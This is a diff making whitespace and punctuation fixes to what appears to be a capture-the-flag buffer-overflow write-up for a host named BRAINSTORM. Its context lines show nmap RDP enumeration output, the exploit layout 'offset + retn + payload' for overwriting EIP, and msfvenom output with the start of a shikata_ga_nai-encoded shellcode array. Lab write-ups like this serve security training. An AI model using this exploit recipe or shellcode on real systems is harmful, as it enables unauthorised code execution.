@@ -28,7 +28,7 @@ Host is up (0.28s latency).
 
 PORT     STATE SERVICE
 3389/tcp open  ms-wbt-server
-| rdp-enum-encryption: 
+| rdp-enum-encryption:
 |   Security layer
 |     CredSSP (NLA): SUCCESS
 |     CredSSP with Early User Auth: SUCCESS
@@ -41,7 +41,7 @@ PORT     STATE SERVICE
 |     128-bit RC4: SUCCESS
 |     FIPS 140-1: SUCCESS
 |_  RDP Protocol Version:  RDP 5.x, 6.x, 7.x, or 8.x server
-| rdp-ntlm-info: 
+| rdp-ntlm-info:
 |   Target_Name: BRAINSTORM
 |   NetBIOS_Domain_Name: BRAINSTORM
 |   NetBIOS_Computer_Name: BRAINSTORM
@@ -171,7 +171,7 @@ got unmodified status.
 
 ### payload structure
 
-Your payload must be in this order: `offset + retn + payload` <- the EIP still needs to be overwritten predictively.
+Your payload must be in this order: `offset + retn + payload` ← the EIP still needs to be overwritten predictively.
 
 ### jmp point address
 
@@ -247,7 +247,7 @@ x86/shikata_ga_nai succeeded with size 351 (iteration=0)
 x86/shikata_ga_nai chosen with final size 351
 Payload size: 351 bytes
 Final size of c file: 1500 bytes
-unsigned char buf[] = 
+unsigned char buf[] =
 "\xdb\xda\xb8\x4c\xf0\x7a\x5c\xd9\x74\x24\xf4\x5b\x31\xc9\xb1"
 "\x52\x31\x43\x17\x03\x43\x17\x83\x8f\xf4\x98\xa9\xf3\x1d\xde"
 "\x52\x0b\xde\xbf\xdb\xee\xef\xff\xb8\x7b\x5f\x30\xca\x29\x6c"
